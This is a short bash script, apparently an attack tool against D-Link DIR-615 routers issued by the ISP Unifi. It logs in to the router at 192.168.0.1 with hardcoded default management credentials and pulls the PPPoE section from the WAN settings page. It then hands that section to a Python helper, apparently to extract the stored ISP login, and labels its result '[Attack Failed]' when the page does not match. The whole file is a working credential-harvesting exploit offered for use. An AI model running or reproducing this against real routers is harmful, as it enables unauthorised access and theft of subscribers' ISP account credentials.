#!/bin/bash
curl -s --cookie-jar dir615_pppoe_atk  --data "ACTION_POST=LOGIN&LOGIN_USER=Management&LOGIN_PASSWD=TestingR2&login=Login+" http://192.168.0.1/login.php > /dev/null
curl -s http://192.168.0.1/bsc_wan.php > dir615_atk_raw
LINE_START=`cat dir615_atk_raw | grep WPPOE_list= -n | cut -d : -f 1`
LINE_END=$((LINE_START + 4))
LINE="$LINE_START,${LINE_END}p;${LINE_END}q"
sed -n $LINE dir615_atk_raw > dir615_atk_js

if [ -s dir615_atk_js ] 
then
	python dir615_unifi.py
else
	echo "[Attack Failed] You are not using DIR-615 @ Unifi"
fi

rm dir615_atk_raw
rm dir615_atk_js
